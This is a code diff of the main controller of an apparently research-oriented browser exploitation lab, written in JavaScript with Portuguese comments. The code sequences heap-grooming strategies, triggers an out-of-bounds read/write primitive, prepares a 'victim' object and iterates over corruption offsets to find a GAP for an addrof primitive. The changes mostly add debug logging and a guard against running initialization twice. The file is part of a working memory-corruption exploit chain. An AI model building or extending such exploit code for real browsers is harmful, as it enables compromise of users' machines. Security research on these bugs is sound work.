@@ -7,19 +7,23 @@ import * as Corruptor from './victim_corruptor.mjs';
 import * as PostExploit from './post_exploit_conceptual.mjs';
 import { updateOOBConfigFromUI as updateGlobalOOBConfig } from './config.mjs';
 
+let uiInitialized = false; // Flag para garantir que a UI é inicializada apenas uma vez
+
 const App = {
-    exploitSuccessful: false, // Flag para indicar se um GAP de sucesso definitivo foi encontrado
-    isCurrentlyRunningStrategies: false, // Flag para evitar execuções concorrentes
+    exploitSuccessfulThisSession: false, // Renomeado para clareza
+    isCurrentlyRunningStrategies: false,
 
     runAllGroomingStrategies: async () => {
         const FNAME_STRAT = "App.runAllGroomingStrategies";
+        const runId = Math.random().toString(16).slice(2,10); // ID único para esta execução
+        appLog(`[${runId}] >>> Entrando em ${FNAME_STRAT}`, 'critical', FNAME_STRAT);
 
         if (App.isCurrentlyRunningStrategies) {
-            appLog("As estratégias de grooming já estão em execução. Aguarde a conclusão.", "warn", FNAME_STRAT);
+            appLog(`[${runId}] WARN: Estratégias já em execução. Chamada ignorada.`, "warn", FNAME_STRAT);
             return;
         }
-        if (App.exploitSuccessful) {
-            appLog("Um GAP de sucesso definitivo já foi encontrado. Para reexecutar, reinicie o laboratório.", "warn", FNAME_STRAT);
+        if (App.exploitSuccessfulThisSession) {
+            appLog(`[${runId}] INFO: GAP de sucesso já encontrado nesta sessão. Para reexecutar, reinicie a página.`, "warn", FNAME_STRAT);
             return;
         }
 
@@ -27,7 +31,7 @@ const App = {
         const btnRunStrategies = document.getElementById('btnRunGroomingStrategies');
         if (btnRunStrategies) btnRunStrategies.disabled = true;
 
-        appLog(`--- Iniciando ${FNAME_STRAT} ---`, 'test', FNAME_STRAT);
+        appLog(`[${runId}] Iniciando ${FNAME_STRAT} com novas estratégias...`, 'test', FNAME_STRAT);
         updateGlobalOOBConfig();
         const spray_count_el = document.getElementById('sprayCountBase');
         const intermediate_allocs_el = document.getElementById('intermediateAllocs');
@@ -44,94 +48,125 @@ const App = {
         Corruptor.resetLastSuccessfulGap();
 
         for (const strat of strategies) {
-            if (Corruptor.getLastSuccessfulGap() !== null) { // Checa se uma estratégia anterior já teve sucesso
-                appLog("GAP de sucesso encontrado por uma estratégia anterior. Interrompendo mais estratégias.", "good", FNAME_STRAT);
-                App.exploitSuccessful = true;
+            appLog(`[${runId}] Loop Estratégia: ${strat.name} - Início`, 'info', FNAME_STRAT);
+            if (Corruptor.getLastSuccessfulGap() !== null) {
+                appLog(`[${runId}] GAP de sucesso encontrado (${Corruptor.getLastSuccessfulGap()}) por estratégia anterior. Interrompendo laço de estratégias.`, "good", FNAME_STRAT);
+                App.exploitSuccessfulThisSession = true;
                 break;
             }
-            appLog(`*** Iniciando Estratégia de Grooming: ${strat.name} ***`, "critical", FNAME_STRAT);
+            appLog(`[${runId}] *** Iniciando Estratégia de Grooming: ${strat.name} ***`, "critical", FNAME_STRAT);
 
             let victimPrepared = false;
             let currentOOBAllocationSize = Core.getOOBAllocationSize();
-            appLog(`   Estratégia '${strat.name}' usando OOB_ALLOCATION_SIZE: ${currentOOBAllocationSize}`, "info", FNAME_STRAT);
+            appLog(`[${runId}]    Estratégia '${strat.name}' usando OOB_ALLOCATION_SIZE: ${currentOOBAllocationSize}`, "info", FNAME_STRAT);
 
             if (strat.oob_first) {
-                appLog(`   Estratégia '${strat.name}': OOB será ativado primeiro.`, "info", FNAME_STRAT);
+                appLog(`[${runId}]    Estratégia '${strat.name}': OOB será ativado primeiro.`, "info", FNAME_STRAT);
+                appLog(`[${runId}]    Antes de Core.triggerOOB_primitive (oob_first)`, "debug", FNAME_STRAT);
                 await Core.triggerOOB_primitive();
-                if (!Core.oob_dataview_real) { appLog("Falha ao ativar OOB (OOB primeiro), pulando estratégia.", "error", FNAME_STRAT); await PAUSE_LAB(500); continue; }
+                appLog(`[${runId}]    Depois de Core.triggerOOB_primitive (oob_first), oob_dataview_real: ${!!Core.oob_dataview_real}`, "debug", FNAME_STRAT);
+                if (!Core.oob_dataview_real) { appLog(`[${runId}] Falha ao ativar OOB (OOB primeiro), pulando estratégia.`, "error", FNAME_STRAT); await PAUSE_LAB(500); continue; }
+
+                appLog(`[${runId}]    Antes de Groomer.groomHeapForSameSize (oob_first)`, "debug", FNAME_STRAT);
                 await Groomer.groomHeapForSameSize(spray_count + strat.spray_adj, currentOOBAllocationSize, intermediate_allocs + strat.inter_adj, false);
+                appLog(`[${runId}]    Depois de Groomer.groomHeapForSameSize (oob_first)`, "debug", FNAME_STRAT);
+
+                appLog(`[${runId}]    Antes de Groomer.prepareVictim (oob_first)`, "debug", FNAME_STRAT);
                 victimPrepared = await Groomer.prepareVictim(currentOOBAllocationSize);
-            } else {
-                appLog(`   Estratégia '${strat.name}': Vítima será preparada primeiro.`, "info", FNAME_STRAT);
+                appLog(`[${runId}]    Depois de Groomer.prepareVictim (oob_first), victimPrepared: ${victimPrepared}`, "debug", FNAME_STRAT);
+            } else { // victim_first
+                appLog(`[${runId}]    Estratégia '${strat.name}': Vítima será preparada primeiro.`, "info", FNAME_STRAT);
+                appLog(`[${runId}]    Antes de Groomer.groomHeapForSameSize (victim_first)`, "debug", FNAME_STRAT);
                 await Groomer.groomHeapForSameSize(spray_count + strat.spray_adj, currentOOBAllocationSize, intermediate_allocs + strat.inter_adj, true);
+                appLog(`[${runId}]    Depois de Groomer.groomHeapForSameSize (victim_first)`, "debug", FNAME_STRAT);
+
+                appLog(`[${runId}]    Antes de Groomer.prepareVictim (victim_first)`, "debug", FNAME_STRAT);
                 victimPrepared = await Groomer.prepareVictim(currentOOBAllocationSize);
+                appLog(`[${runId}]    Depois de Groomer.prepareVictim (victim_first), victimPrepared: ${victimPrepared}`, "debug", FNAME_STRAT);
+
                 if (victimPrepared) {
-                    appLog(`   Estratégia '${strat.name}': Vítima preparada, ativando OOB agora.`, "info", FNAME_STRAT);
+                    appLog(`[${runId}]    Estratégia '${strat.name}': Vítima preparada, ativando OOB agora.`, "info", FNAME_STRAT);
+                    appLog(`[${runId}]    Antes de Core.triggerOOB_primitive (victim_first, OOB after victim)`, "debug", FNAME_STRAT);
                     await Core.triggerOOB_primitive();
-                    if (!Core.oob_dataview_real) { appLog("Falha ao ativar OOB (após vítima), pulando estratégia.", "error", FNAME_STRAT); await PAUSE_LAB(500); continue; }
+                    appLog(`[${runId}]    Depois de Core.triggerOOB_primitive (victim_first, OOB after victim), oob_dataview_real: ${!!Core.oob_dataview_real}`, "debug", FNAME_STRAT);
+                    if (!Core.oob_dataview_real) { appLog(`[${runId}] Falha ao ativar OOB (após vítima), pulando estratégia.`, "error", FNAME_STRAT); await PAUSE_LAB(500); continue; }
                 }
             }
 
-            appLog(`   Estratégia '${strat.name}': Status Pós-Preparação -> victimPrepared: ${victimPrepared}, Groomer.victim_object existe: ${!!Groomer.victim_object}`, "info", FNAME_STRAT);
-            if (Groomer.victim_object && victimPrepared) { // Adicionado victimPrepared aqui
-                appLog(`      Groomer.victim_object.length: ${Groomer.victim_object.length}`, "info", FNAME_STRAT);
+            appLog(`[${runId}]    Estratégia '${strat.name}': Status Pós-Preparação -> victimPrepared: ${victimPrepared}, Groomer.victim_object existe: ${!!Groomer.victim_object}`, "info", FNAME_STRAT);
+            if (Groomer.victim_object && victimPrepared) {
+                appLog(`[${runId}]       Groomer.victim_object.length: ${Groomer.victim_object.length}`, "info", FNAME_STRAT);
             }
 
             if (!victimPrepared) {
-                appLog(`   Estratégia '${strat.name}': Falha ao preparar vítima (victimPrepared é false). Pulando corrupção.`, "error", FNAME_STRAT);
+                appLog(`[${runId}]    Estratégia '${strat.name}': Falha ao preparar vítima (victimPrepared é false). Pulando corrupção.`, "error", FNAME_STRAT);
                 await PAUSE_LAB(500); continue;
             }
             if (!Groomer.victim_object) {
-                 appLog(`   Estratégia '${strat.name}': ERRO CRÍTICO: Groomer.victim_object é null ANTES de chamar findAndCorrupt. Pulando corrupção.`, "error", FNAME_STRAT);
+                 appLog(`[${runId}]    Estratégia '${strat.name}': ERRO CRÍTICO FINAL CHECK: Groomer.victim_object é null ANTES de chamar findAndCorrupt. Pulando corrupção.`, "error", FNAME_STRAT);
                  await PAUSE_LAB(500); continue;
             }
             if (!Core.oob_dataview_real) {
-                appLog(`   Estratégia '${strat.name}': ERRO CRÍTICO: Primitiva OOB não está ativa ANTES de chamar findAndCorrupt. Pulando corrupção.`, "error", FNAME_STRAT);
+                appLog(`[${runId}]    Estratégia '${strat.name}': ERRO CRÍTICO: Primitiva OOB não está ativa ANTES de chamar findAndCorrupt. Pulando corrupção.`, "error", FNAME_STRAT);
                 await PAUSE_LAB(500); continue;
             }
 
-            appLog(`   Estratégia '${strat.name}': Vítima OK, OOB OK. Tentando corrupção...`, "info", FNAME_STRAT);
-            await Corruptor.findAndCorruptVictimFields_Iterative(); // Esta função define Corruptor.last_successful_gap
+            appLog(`[${runId}]    Estratégia '${strat.name}': Vítima OK, OOB OK. Tentando corrupção...`, "info", FNAME_STRAT);
+            appLog(`[${runId}]    Antes de Corruptor.findAndCorruptVictimFields_Iterative`, "debug", FNAME_STRAT);
+            await Corruptor.findAndCorruptVictimFields_Iterative();
+            appLog(`[${runId}]    Depois de Corruptor.findAndCorruptVictimFields_Iterative. Gap encontrado: ${Corruptor.getLastSuccessfulGap()}`, "debug", FNAME_STRAT);
 
-            if (Corruptor.getLastSuccessfulGap() !== null) { // Verifica imediatamente após a tentativa de corrupção
-                appLog(`GAP de sucesso encontrado pela estratégia '${strat.name}'! Interrompendo mais estratégias.`, "good", FNAME_STRAT);
-                App.exploitSuccessful = true;
-                break; // Sai do loop de estratégias
+            if (Corruptor.getLastSuccessfulGap() !== null) {
+                appLog(`[${runId}] GAP de sucesso encontrado (${Corruptor.getLastSuccessfulGap()}) pela estratégia '${strat.name}'! Interrompendo mais estratégias.`, "good", FNAME_STRAT);
+                App.exploitSuccessfulThisSession = true;
+                break;
             }
-            await PAUSE_LAB(2000); // Pausa entre estratégias se nenhum GAP foi encontrado ainda
+            appLog(`[${runId}]    Estratégia ${strat.name} concluída, nenhum GAP encontrado ainda. Antes de PAUSE_LAB(2000)`, "info", FNAME_STRAT);
+            await PAUSE_LAB(2000);
+            appLog(`[${runId}]    Depois de PAUSE_LAB(2000)`, "debug", FNAME_STRAT);
+            appLog(`[${runId}] Loop Estratégia: ${strat.name} - Fim`, "info", FNAME_STRAT);
         } // Fim do loop for (const strat of strategies)
 
-        appLog(`--- ${FNAME_STRAT} Concluído ---`, 'test', FNAME_STRAT);
+        appLog(`[${runId}] --- ${FNAME_STRAT} Concluído (Após loop de estratégias) ---`, 'test', FNAME_STRAT);
         if (Corruptor.getLastSuccessfulGap() !== null) {
-            appLog(`GAP de SUCESSO encontrado e armazenado: ${Corruptor.getLastSuccessfulGap()}.`, "vuln", FNAME_STRAT);
-            App.exploitSuccessful = true;
+            appLog(`[${runId}] GAP de SUCESSO encontrado e armazenado: ${Corruptor.getLastSuccessfulGap()}.`, "vuln", FNAME_STRAT);
+            App.exploitSuccessfulThisSession = true;
             const addrofGapEl = document.getElementById('addrofGap');
             if (addrofGapEl) addrofGapEl.value = Corruptor.getLastSuccessfulGap();
-            if (btnRunStrategies) btnRunStrategies.textContent = "GAP Encontrado!"; // Muda o texto e mantém desabilitado
+            if (btnRunStrategies) btnRunStrategies.textContent = "GAP Encontrado! Recarregue para tentar de novo."; // Mantém desabilitado
             // Não reabilita o botão aqui se foi sucesso
         } else {
-            appLog("Nenhuma estratégia resultou em GAP de sucesso.", "error", FNAME_STRAT);
+            appLog(`[${runId}] Nenhuma estratégia resultou em GAP de sucesso nesta rodada.`, "error", FNAME_STRAT);
             if (btnRunStrategies) btnRunStrategies.disabled = false; // Reabilita se não houve sucesso
         }
         App.isCurrentlyRunningStrategies = false;
+        appLog(`[${runId}] <<< Saindo de ${FNAME_STRAT}`, 'critical', FNAME_STRAT);
     }, // Fim de runAllGroomingStrategies
 
     updateCurrentTestGapFromScanUIAndTestSingle: () => {
+        const FNAME_SINGLE = "App.updateCurrentTestGapFromScanUIAndTestSingle";
+        appLog(`>>> Entrando em ${FNAME_SINGLE}`, "info", FNAME_SINGLE);
         const gapStartScanEl = document.getElementById('gapStartScan');
         const gapVal = gapStartScanEl ? parseInt(gapStartScanEl.value) : NaN;
 
         if (!isNaN(gapVal)) {
             Corruptor.setCurrentTestGap(gapVal);
             appLog(`CURRENT_TEST_GAP (teste único) atualizado para: ${Corruptor.getCurrentTestGap()} bytes.`, 'tool', 'App.Config');
-            if (!Groomer.victim_object || !Core.oob_dataview_real) {
-                appLog("ERRO: Vítima ou primitiva OOB não estão prontas para teste de GAP único. Execute os Passos 0 e 1 (ou uma estratégia de grooming).", "error", "App.Config");
+            if (!Groomer.victim_object) {
+                appLog("ERRO: Vítima não preparada. Execute Passo 1 ou uma estratégia de grooming primeiro.", "error", "App.Config");
+                return;
+            }
+            if (!Core.oob_dataview_real) {
+                appLog("ERRO: Primitiva OOB não ativa. Execute Passo 0 primeiro.", "error", "App.Config");
                 return;
             }
             Corruptor.try_corrupt_fields_for_gap(Corruptor.getCurrentTestGap());
         } else { appLog("Valor de GAP inválido.", "error", "App.Config"); }
-    },
+        appLog(`<<< Saindo de ${FNAME_SINGLE}`, "info", FNAME_SINGLE);
+    }, // Fim de updateCurrentTestGapFromScanUIAndTestSingle
 
     setupUIEventListeners: () => {
+        // ... (sem alterações aqui, a passagem de appLog para Int64Lib.testModule já estava correta) ...
         const moduleTestButtonsContainer = document.getElementById('moduleTestButtons');
         if (moduleTestButtonsContainer) {
             moduleTestButtonsContainer.innerHTML = '';
@@ -168,24 +203,28 @@ const App = {
         document.getElementById('oobAllocSize')?.addEventListener('change', updateGlobalOOBConfig);
         document.getElementById('baseOffset')?.addEventListener('change', updateGlobalOOBConfig);
         document.getElementById('initialBufSize')?.addEventListener('change', updateGlobalOOBConfig);
-    },
+    }, // Fim de setupUIEventListeners
 
     initialize: () => {
+        if (uiInitialized) {
+            appLog("App.initialize: UI já inicializada. Ignorando.", "warn", "App.Init");
+            return;
+        }
         updateGlobalOOBConfig();
         App.setupUIEventListeners();
-        App.exploitSuccessful = false; // Reseta a flag de sucesso da sessão
-        App.isCurrentlyRunningStrategies = false; // Reseta a flag de execução
+        App.exploitSuccessfulThisSession = false;
+        App.isCurrentlyRunningStrategies = false;
         const btnRunStrategies = document.getElementById('btnRunGroomingStrategies');
         if (btnRunStrategies) {
-            btnRunStrategies.disabled = false; // Garante que o botão está habilitado no início
+            btnRunStrategies.disabled = false;
             btnRunStrategies.textContent = "Executar Todas Estratégias de Grooming & Busca de GAP";
         }
-        appLog("Laboratório Modularizado (v2.8.4 - Controle Exec Estratégias) pronto.", "good", "App.Init");
-
+        appLog("Laboratório Modularizado (v2.8.5 - Debug Reinício) pronto.", "good", "App.Init");
         const addrofGapEl = document.getElementById('addrofGap');
-        if (addrofGapEl) addrofGapEl.value = ""; // Limpa o campo de GAP para addrof
-    }
-};
+        if (addrofGapEl) addrofGapEl.value = "";
+        uiInitialized = true;
+    } // Fim de initialize
+}; // Fim do objeto App
 
 if (document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', App.initialize);
